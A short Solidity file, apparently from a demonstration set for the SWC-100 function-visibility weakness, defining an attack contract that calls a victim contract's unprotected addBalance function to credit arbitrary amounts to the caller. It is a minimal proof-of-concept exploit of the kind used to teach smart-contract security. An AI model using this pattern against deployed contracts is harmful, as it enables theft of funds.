pragma solidity ^0.4.0;
import './SWC100_Visibility_Bug.sol';

contract attack_SWC100{
    Visibility_victim victimContract;
    constructor( address _victimContractAddress){
        victimContract = Visibility_victim(_victimContractAddress);
    }

    function addBalanceAttack(uint256 _amount){
        victimContract.addBalance(_amount, msg.sender);
    }
} 